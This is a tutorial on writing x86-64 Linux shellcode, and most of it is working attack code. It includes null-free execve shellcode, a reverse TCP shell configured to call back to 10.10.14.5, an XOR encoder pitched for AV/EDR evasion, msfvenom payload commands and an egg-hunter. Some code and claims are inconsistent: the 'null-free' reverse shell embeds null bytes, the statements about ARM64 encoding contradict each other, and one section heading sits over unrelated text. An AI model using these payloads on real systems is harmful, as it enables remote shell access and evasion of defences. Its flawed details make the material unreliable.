Shellcode

Writing position-independent machine code payloads in x86-64 assembly - from first syscall to reverse TCP shell with null-byte avoidance and encoding.

Overview

Shellcode is the raw machine code an exploit runs after it hijacks a process. This article explains what makes a payload position-independent and null-free, shows how to write and extract execve and reverse TCP shells in x86-64 assembly, and covers encoders, alphanumeric payloads, egg-hunters, and the tools used to verify every byte. By the end you can assemble a payload, extract the opcodes, run it through a harness, and explain what the kernel does when it executes.

What Shellcode Is

Shellcode is a string of bytes (opcodes) that represents position-independent machine code. It is the payload delivered by an exploit - injected into a process's address space and executed. The term "shellcode" originates from its original purpose: spawning a shell (/bin/sh). Modern shellcode encompasses any payload: reverse shells, file downloads, privilege escalation stubs, meterpreter stagers.

Four properties define well-written shellcode:

Property Why It Matters
Position-independent The code cannot assume it lives at any fixed virtual address
No null bytes(usually) String functions (strcpy, gets) terminate on\x00- your payload stops there
Small size Buffer space is always limited; every byte matters
Self-contained No external library calls - only raw syscalls

Position independence means no call to absolute addresses, no jmp to hardcoded locations, and no data references outside the payload body. On x86-64, instruction-pointer-relative addressing solves data access; on x86-32, the classic call/pop trick recovers the instruction pointer.

Null-byte avoidance is payload-specific. A TCP reverse shell payload sent over a socket can contain null bytes. A payload injected through strcpy() in a buffer overflow cannot. Always write shellcode null-free by default - it works in both contexts.

The First Principle: execve(2)

Every shellcode journey starts with one system call: execve("/bin/sh", NULL, NULL) . Here is the man page signature: 

#include <unistd.h>
int execve(const char *pathname, char *const _Nullable argv[],
           char *const _Nullable envp[]);

On x86-64 Linux, the syscall interface is:

Register Role Value for execve
rax Syscall number 59 (0x3b)
rdi 1st argument pointer to"/bin/sh\0"
rsi 2nd argument pointer toargvarray ([ptr_to_string, NULL]) or NULL
rdx 3rd argument pointer toenvparray or NULL
syscall Instruction Enters kernel mode

The kernel looks up rax in the syscall table, copies arguments from registers, validates them, and performs the execve operation - replacing the current process image with /bin/sh .

Hand-Writing execve Shellcode in NASM

The following assembly spawns /bin/sh with no null bytes. Each instruction is annotated with why it avoids null bytes. 

; execve.nasm — Null-free execve("/bin/sh", NULL, NULL)
; Assemble: nasm -f elf64 execve.nasm -o execve.o
; Link:     ld -s execve.o -o execve
; Extract:  objcopy -O binary execve execve.bin
; Hexdump:  xxd -i execve.bin

BITS 64
section .text
global _start

_start:
    ; ── Strategy ──
    ; Push "//bin/sh" + null terminator onto the stack.
    ; "//bin/sh" is 8 bytes — no null bytes in the string itself.
    ; The double slash is harmless: //bin/sh resolves identically to /bin/sh.
    ;
    ; Null-byte avoidance techniques used:
    ;   1. xor reg, reg         — zero register without embedding \x00
    ;   2. push/pop             — avoid mov with 64-bit immediates (which contain zeros)
    ;   3. mov al, imm8         — set rax low byte without zeroing upper bytes
    ;      (rax is already zeroed by xor, so upper bytes stay zero)
    ;   4. cdq / cqo            — sign-extend rax into rdx (rdx = 0 when rax >= 0)

    ; Zero rsi (argv = NULL)
    xor rsi, rsi

    ; Push null terminator onto stack
    push rsi                  ; \x00\x00\x00\x00\x00\x00\x00\x00 (rsi = 0)

    ; Push "/bin//sh" (0x68732f2f6e69622f in little-endian)
    ; In memory: '/' '/' 'b' 'i' 'n' '/' '/' 's' 'h'
    mov rdi, 0x68732f2f6e69622f
    push rdi

    ; rdi = pointer to the start of "/bin//sh" on stack
    mov rdi, rsp

    ; Zero rdx (envp = NULL)
    xor rdx, rdx

    ; Build argv array on stack: [ptr_to_string, NULL]
    ; argv layout in memory (low to high):
    ;   [address of "/bin//sh"] [NULL (0)]
    push rsi                  ; push NULL terminator for argv
    push rdi                  ; push pointer to "/bin//sh"
    mov rsi, rsp              ; rsi = pointer to argv array

    ; rax = 59 (execve syscall number)
    ; Using mov al avoids 64-bit immediate with null bytes
    xor rax, rax
    mov al, 59

    syscall

Why This Works - Null Byte Audit

xor rsi, rsi encodes as 48 31 f6 - no \x00 . push rsi is 56 - no \x00 . mov rdi, 0x68732f2f6e69622f encodes as 48 bf 2f 62 69 6e 2f 2f 73 68 - the immediate contains no \x00 because we chose a string that packs cleanly into 8 bytes.

What if we wrote mov rdi, 0x0068732f6e69622f (with a leading null byte, as "/bin/sh" is 7 bytes)? The opcode would contain \x00 and the payload would be truncated by any string-based copy.

String-to-Immediate Converter

#!/usr/bin/env python3
"""Convert a string to a little-endian 64-bit hex immediate for nasm."""

def string_to_imm(text: str, warn_size: bool = True) -> str:
    if len(text) > 8:
        raise ValueError(f"String '{text}' exceeds 8 bytes ({len(text)} bytes)")
    if warn_size and len(text) < 8:
        padded = text + '\x00' * (8 - len(text))
        print(f"[!] String padded to 8 bytes with nulls — null-byte risk!")
        print(f"    Consider padding with '/' instead: '{text}' + '/' * ({8 - len(text)})")
    encoded = text.encode('latin-1')
    padded = encoded.ljust(8, b'\x00')
    value = int.from_bytes(padded, 'little')
    return f"0x{value:016x}"

print(string_to_imm("/bin/sh"))   # WARNING: padded with \x00
print(string_to_imm("/bin//sh"))  # Clean: 0x68732f2f6e69622f

Extracting Shellcode Bytes

The assembly is not shellcode until you strip the ELF wrapper and extract raw opcodes.

# 1. Assemble to ELF object file
nasm -f elf64 execve.nasm -o execve.o

# 2. Link to ELF executable (strip symbols: -s)
ld -s execve.o -o execve

# 3. Verify it runs standalone
./execve
# You should be in a new /bin/sh process. Exit with Ctrl+D or 'exit'.

# 4. Extract raw machine code (position-independent binary blob)
objcopy -O binary execve execve.bin

# 5. Inspect the bytes
hd execve.bin
# Example output:
# 00000000  48 31 f6 56 48 bf 2f 62  69 6e 2f 2f 73 68 57 48  |H1.VH./bin//shWH|
# 00000010  89 e7 48 31 d2 56 57 48  89 e6 48 31 c0 b0 3b 0f  |..H1.VWH..H1..;.|
# 00000020  05                                                |.|

# 6. Generate C array for inclusion in exploit
xxd -i execve.bin
# Output:
# unsigned char execve_bin[] = {
#   0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
#   0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31,
#   0xd2, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0,

# 7. Verify null-byte count

The C Test Harness

Never embed shellcode directly in a string literal and cast it - modern toolchains put .rodata in non-executable pages. Use mmap with PROT_READ | PROT_WRITE | PROT_EXEC . 

/*
 * harness.c — Test shellcode safely with mmap RWX allocation.
 * Compile: gcc -Wall -Wextra -o harness harness.c
 * Run:     ./harness
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

/* Paste the xxd -i output here */
unsigned char payload[] = {
    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x31,
    0xd2, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xc0, 0xb0,
    0x3b, 0x0f, 0x05
};

int main(void) {
    size_t payload_len = sizeof(payload);
    long page_size = sysconf(_SC_PAGESIZE);

    /* Allocate RWX memory via mmap — the only portable way to get
     * simultaneously writable and executable pages on modern kernels. */
    void *exec_mem = mmap(
        NULL,
        payload_len,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    memcpy(exec_mem, payload, payload_len);

    printf("[+] Shellcode at %p, length = %zu bytes\n", exec_mem, payload_len);
    printf("[+] Jumping to shellcode...\n");

    /* Cast shellcode to function pointer and call it */
    void (*shellcode_fn)(void) = (void (*)(void)) exec_mem;
    shellcode_fn();

    /* execve replaces the process — this line never executes on success */
    fprintf(stderr, "[-] execve failed — shell did not spawn\n");
    munmap(exec_mem, payload_len);
    return EXIT_FAILURE;
}
						
# Compile and test
gcc -Wall -Wextra -o harness harness.c
./harness
# Should drop you into /bin/sh. Type 'id' to verify.

# Trace syscalls to see what happens
strace -f ./harness 2>&1 | tail -20

Reverse TCP Shell in Assembly

A reverse shell connects back to an attacker-controlled listener. Syscalls involved:

Order Syscall Number Purpose
1 socket(2) 41 Create a TCP socket
2 connect(2) 42 Initiate outbound connection to attacker
3 dup2(2)x 3 33 Redirect stdin, stdout, stderr to socket
4 execve(2) 59 Replace process with shell

Each syscall must be position-independent and null-free. The connect syscall requires a sockaddr_in structure containing the attacker's IP and port. This structure is built on the stack at runtime using push instructions. 

; reverse-tcp.nasm — Null-free reverse TCP shell, x86-64 Linux
; Assemble and extract same workflow as execve shellcode.
;
; Configuration: change IP_ADDR and PORT before assembling.
; IP_ADDR: network byte order (big-endian) — 0x0100007f = 127.0.0.1
; PORT:    network byte order — 0x5c11 = port 4444 (0x115c in host order)

BITS 64
section .text
global _start

_start:
    ; ═══════════════════════════════════════════════════════════
    ; Step 1: socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    ;   int socket(int domain, int type, int protocol);
    ;   syscall number: 41
    ;   AF_INET = 2, SOCK_STREAM = 1, IPPROTO_TCP = 0
    ; ═══════════════════════════════════════════════════════════

    xor rax, rax
    mov al, 41                ; syscall: socket
    xor rdi, rdi
    mov dil, 2                ; domain: AF_INET
    xor rsi, rsi
    mov sil, 1                ; type: SOCK_STREAM
    xor rdx, rdx              ; protocol: 0 (IPPROTO_TCP — default)
    syscall

    ; Save socket file descriptor in r12 (callee-saved, persists across syscalls)
    mov r12, rax

    ; ═══════════════════════════════════════════════════════════
    ; Step 2: Build sockaddr_in on stack and call connect
    ;   int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ;   syscall number: 42
    ;
    ; struct sockaddr_in layout (16 bytes):
    ;   Offset  Size  Field
    ;   0       2     sin_family (AF_INET = 2)
    ;   2       2     sin_port   (network byte order)
    ;   4       4     sin_addr   (network byte order)
    ;   8       8     sin_zero   (padding, zeroes)
    ; ═══════════════════════════════════════════════════════════

    ; Push sockaddr_in onto the stack, building it from high to low addresses
    xor rax, rax
    push rax                  ; sin_zero[8] = 0 (padding)

    ; Build the rest using dword and word pushes for compactness
    ; Layout on stack after pushes (low → high):
    ;   sin_family (2 bytes) | sin_port (2 bytes) | sin_addr (4 bytes) | sin_zero (8 bytes)

    ; Configure these before assembling:
    ; IP: 127.0.0.1 = 0x7f000001 in host byte order → 0x0100007f in network byte order
    ; Port: 4444 = 0x115c in host byte order → 0x5c11 in network byte order
    ; AF_INET = 0x0002

    mov rax, 0x0100007f       ; sin_addr = 127.0.0.1 (network byte order)
    push rax
    push word 0x5c11          ; sin_port = 4444 (network byte order)
    push word 0x0002          ; sin_family = AF_INET

    mov rsi, rsp              ; rsi = pointer to sockaddr_in

    ; connect(sockfd, &addr, 16)
    xor rax, rax
    mov al, 42                ; syscall: connect
    mov rdi, r12              ; sockfd (saved from socket())
    ; rsi already set to &addr
    xor rdx, rdx
    mov dl, 16                ; addrlen = sizeof(sockaddr_in)
    syscall

    ; Check connect return: rax should be 0 on success
    ; Negative value (errno) means connection failed

    ; ═══════════════════════════════════════════════════════════
    ; Step 3: dup2() — redirect stdin (0), stdout (1), stderr (2) → socket
    ;   int dup2(int oldfd, int newfd);
    ;   syscall number: 33
    ;
    ; After these calls, anything written to stdout goes through the
    ; socket, and anything read from stdin comes from the socket.
    ; The attacker's listener now has full shell interaction.
    ; ═══════════════════════════════════════════════════════════

    mov rdi, r12              ; oldfd = sockfd

    xor rax, rax
    mov al, 33                ; syscall: dup2
    xor rsi, rsi              ; newfd = 0 (stdin)
    syscall

    mov al, 33
    inc rsi                   ; newfd = 1 (stdout)
    syscall

    mov al, 33
    inc rsi                   ; newfd = 2 (stderr)
    syscall

    ; ═══════════════════════════════════════════════════════════
    ; Step 4: execve("/bin/sh", NULL, NULL)
    ;   Identical to the execve shellcode from before.
    ; ═══════════════════════════════════════════════════════════

    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp

    xor rdx, rdx
    push rsi
    push rdi
    mov rsi, rsp

    xor rax, rax
    mov al, 59                ; syscall: execve
    syscall

Reverse TCP Configuration Script - change IP /port without manual hex conversion: 

#!/usr/bin/env python3
"""Generate nasm defines for reverse TCP shell configuration."""

import socket
import sys

def ip_to_hex(ip_str: str) -> str:
    """Convert dotted-quad IP to network-byte-order hex immediate."""
    packed = socket.inet_aton(ip_str)
    value = int.from_bytes(packed, 'big')
    return f"0x{value:08x}"

def port_to_hex(port: int) -> str:
    """Convert port number to network-byte-order hex word."""
    value = socket.htons(port)
    return f"0x{value:04x}"

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

    print(f"%define IP_ADDR  {ip_to_hex(ip)}     ; {ip}")
    print(f"%define PORT     {port_to_hex(port)}  ; {port}")
						
# Generate defines and assemble with them
python3 config.py 10.10.14.5 9001 > config.inc
nasm -f elf64 -DIP_ADDR=0x$(python3 -c "import socket; print(socket.inet_aton('10.10.14.5')[::-1].hex())") \
    -DPORT=0x$(python3 -c "import struct; print(struct.pack('>H', 9001).hex())") \
    reverse-tcp.nasm -o reverse-tcp.o

Shellcode Encoding - XOR Obfuscation

Shellcode encoders transform the payload to bypass signature-based detection (AV/ EDR ) and character restrictions (alphanumeric-only input). The simplest encoder is single-byte XOR.

How it works: Choose a key byte K . XOR every byte of the original shellcode with K . The encoded payload contains no recognizable opcodes. The decoder stub is prepended - it loops over the encoded bytes, XORs each with K , and jumps to the decoded payload. 

; xor-decoder.nasm — Decoder stub prepended to XOR-encoded shellcode.
; The decoder is self-contained and position-independent.
;
; Layout: [decoder stub] [XOR-encoded payload]
; The decoder computes its own address, finds the encoded payload,
; decodes it in-place, then jumps to it.

BITS 64
section .text
global _start

_start:
    jmp get_payload_addr     ; Relative jump — no absolute addresses

decoder_start:
    ; Pop the address of the encoded payload (placed by get_payload_addr)
    pop rsi                   ; rsi = address of encoded_payload

    ; Decode loop setup
    xor rcx, rcx
    mov cl, payload_len       ; number of bytes to decode

decode_loop:
    xor byte [rsi + rcx - 1], 0xAA   ; XOR each byte with key 0xAA
    loop decode_loop                  ; ecx--, jump if ecx > 0

    ; Fall through to decoded payload
    jmp encoded_payload

get_payload_addr:
    call decoder_start        ; Push address of encoded_payload onto stack
encoded_payload:
    ; XOR-encoded shellcode bytes go here
    ; (original bytes each XORed with 0xAA)

Python XOR Encoder

#!/usr/bin/env python3
"""XOR-encode shellcode and wrap it with a decoder stub."""

import sys
import random

def xor_encode(shellcode: bytes, key: int) -> bytes:
    """XOR each byte of shellcode with key."""
    return bytes(b ^ key for b in shellcode)

def generate_decoder_stub(key: int, encoded_len: int) -> bytes:
    """
    Generate the position-independent XOR decoder stub.
    This stub must be null-free. The jmp/call/pop pattern
    recovers the address of the encoded payload.
    """
    # x86-64 XOR decoder stub (null-free, 30 bytes)
    # Key is hardcoded into the stub as an immediate byte.
    stub = bytes([
        0xEB, 0x0E,                   # jmp short get_payload
        # decoder_start:
        0x5E,                         # pop rsi
        0x48, 0x31, 0xC9,             # xor rcx, rcx
        0xB1, encoded_len,            # mov cl, encoded_len (max 255 with this stub)
        # decode_loop:
        0x80, 0x74, 0x0E, 0xFF, key,  # xor byte [rsi + rcx - 1], key
        0xE2, 0xF8,                   # loop decode_loop
        0xFF, 0xE6,                   # jmp rsi
        # get_payload:
        0xE8, 0xED, 0xFF, 0xFF, 0xFF, # call decoder_start
    ])
    return stub

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> [key]")
        sys.exit(1)

    with open(sys.argv[1], 'rb') as f:
        original = f.read()

    key = int(sys.argv[2], 16) if len(sys.argv) > 2 else random.randint(1, 255)
    print(f"[*] XOR Key: 0x{key:02x}")
    print(f"[*] Original length: {len(original)} bytes")

    encoded = bytes(b ^ key for b in original)

    # Verify no null bytes in encoded payload (decoder stub is already null-free)
    null_count = encoded.count(0)
    if null_count > 0:
        print(f"[!] Encoded payload contains {null_count} null bytes")
        print("[!] Try a different key value")

    stub = generate_decoder_stub(key, len(original))
    final = stub + encoded

    print(f"[*] Decoder stub: {len(stub)} bytes")
    print(f"[*] Final payload: {len(final)} bytes")

    outfile = sys.argv[1].replace('.bin', '-encoded.bin')
    with open(outfile, 'wb') as f:
        f.write(final)
    print(f"[+] Written to {outfile}")

if __name__ == "__main__":
    main()

Alphanumeric Shellcode

Some exploits filter input to printable ASCII only (0x20-0x7e). Alphanumeric shellcode uses only bytes that map to letters, digits, and certain punctuation. This exploits that many x86 opcodes fall in the printable range - the trick is chaining them to produce arbitrary behavior.

Common alphanumeric gadgets on x86-64:

Bytes Decoded Instruction Effect
P(0x50) push rax Push rax onto stack
X(0x58) pop rax Pop into rax
Z(0x5a) pop rdx Pop into rdx
H(0x48) REX.W prefix 64-bit operand size
1(0x31) xor r/m, r XOR operation
@(0x40) REX prefix Extends register encoding

Msfvenom generates alphanumeric payloads with the x64/xor encoder set to alphanumeric mode. Manual construction is an academic exercise - in practice, use msfvenom : 

# Alphanumeric (mixed) shellcode for x86-64
msfvenom -p linux/x64/exec CMD=/bin/sh \
    -e x64/xor \
    ENCODERS=alphanumixed \
    -f c

# Pure alphanumeric (letters + digits only, no punctuation)
msfvenom -p linux/x64/exec CMD=/bin/sh \
    -e x64/xor \
    ENCODERS=alphanum \
    -f c

The Egg-Hunter Pattern

An egg-hunter is a small piece of shellcode that searches memory for a marker (the "egg" - typically a 4-byte tag repeated twice) and jumps into the payload found after it. Used when you have a tiny injection point (50 bytes) and need to execute a large payload stored elsewhere in memory. 

; egg-hunter.nasm — Searches memory for tag "EGG!" repeated twice,
; then jumps to the payload following it.
; x86-64 Linux, using access(2) syscall for page-boundary-safe scanning.

BITS 64
section .text
global _start

_start:
    ; Start scanning from a reasonable address.
    ; On Linux, the stack is typically around 0x7fff... range.
    ; We scan upward, skipping unmapped pages via access() EFAULT detection.
    xor rdi, rdi
    mul rdi                    ; rax = 0, rdx = 0
    mov r8, 0x7f0000000000     ; scan start address (adjustable)

next_page:
    ; Check if page is readable using access(2) syscall (21)
    lea rbx, [r8 + 0x1000]     ; rbx = page boundary
    xor rax, rax
    mov al, 21                 ; access
    mov rdi, r8
    xor rsi, rsi               ; mode = F_OK
    syscall

    cmp al, 0xf2               ; EFAULT = -14 (0xf2 in unsigned)
    je skip_page

    ; Page is mapped — search for the egg
    mov rdi, r8                ; rdi = scan pointer (scasq advances rdi)
search_loop:
    ; Check if we hit page boundary
    cmp rdi, rbx
    jae skip_page

    ; Compare 8 bytes at [rdi] with the double-egg pattern
    mov rax, 0x2147474521474745  ; "EGG!EGG!" in little-endian
    scasq                       ; compare rax with [rdi], advance rdi by 8
    jne search_loop

    ; Egg found! rdi now points to 8 bytes past the egg (the payload)
    ; Jump to payload
    jmp rdi

skip_page:
    ; Move to next page
    or r8, 0x0fff              ; align to page end
    inc r8                     ; next page start
    jmp next_page

Common Mistakes When Writing Shellcode

Mistake Symptom Solution
Null bytes in payload Shellcode truncated after first\x00 Audit withxxd \| grep 00. Rewrite instructions to avoid 64-bit immediates with high zero bytes.
Using.datasection and referencing it absolutely Segfault because.datais at a different address in target Put all data on the stack at runtime or use RIP-relative addressing
Forgettingcdq/xor rdx,rdxbefore execve execve reads garbage as envp -> fails Always zerordxbefore the execve syscall
push imm64-> null bytes push 0x0000000000000001has 7 null bytes Usepush imm32when value fits in 32 bits
Not saving socket fd beforedup2loop rdigets clobbered Store in a callee-saved register (r12-r15)
Wrong byte order for IP/port insockaddr_in connect() succeeds but goes to wrong IP/port Use network byte order (big-endian). Verify with Python'ssocket.htons()/socket.inet_aton()
Assuming shellcode runs in.text W^X protection kills the process Usemmap(PROT_RWX)in harness; in real exploits, usemprotect()or ROP to callmprotect

1. strace - Trace Syscalls

Insert int3 (opcode 0xCC ) as the first byte of shellcode to break immediately:

Architecture Differences

Property x86-64 x86-32 AArch64 (ARM64)
Syscall instruction syscall int 0x80 svc #0
Syscall number register rax eax x8
Arg 1 register rdi ebx x0
Arg 2 register rsi ecx x1
Arg 3 register rdx edx x2
execve syscall number 59 11 221
Return value register rax eax x0
Null-free zeroing xor rdi, rdi(3 bytes) xor ebx, ebx(2 bytes) mov x0, xzr(4 bytes, contains \x00)
Stack pointer rsp esp sp

ARM64 null-byte challenge: mov x0, xzr encodes as 0xaa1f03e0 - no null bytes. mov x0, #59 encodes as 0xd2800760 - also null-free. But string references require adr instruction with page-relative offset, which may embed null bytes depending on alignment.

Verification Checklist

After writing shellcode, verify each property:

#!/bin/bash
# verify-shellcode.sh — Automated shellcode quality checks
SHELLCODE_BIN="$1"

echo "[*] Analyzing: $SHELLCODE_BIN"

# 1. Size
SIZE=$(stat --format=%s "$SHELLCODE_BIN")
echo "    Size: $SIZE bytes"

# 2. Null byte count
NULLS=$(xxd -p "$SHELLCODE_BIN" | tr -d '\n' | fold -w2 | grep -c '00')
if [ "$NULLS" -gt 0 ]; then
    echo "    [!] $NULLS null bytes found"
    echo "    Null byte offsets:"
    xxd "$SHELLCODE_BIN" | grep ' 00'
else
    echo "    [+] No null bytes"
fi

# 3. Test execution (if it's an ELF)
if [ -x "$SHELLCODE_BIN" ]; then
    echo "[*] Running shellcode..."
    timeout 3 "$SHELLCODE_BIN" < /dev/null 2>&1 &
    PID=$!
    sleep 1
    if kill -0 $PID 2>/dev/null; then
        echo "    [+] Shellcode is running (PID $PID)"
        kill $PID 2>/dev/null
    else
        echo "    [-] Shellcode exited immediately (expected for execve)"
    fi
fi
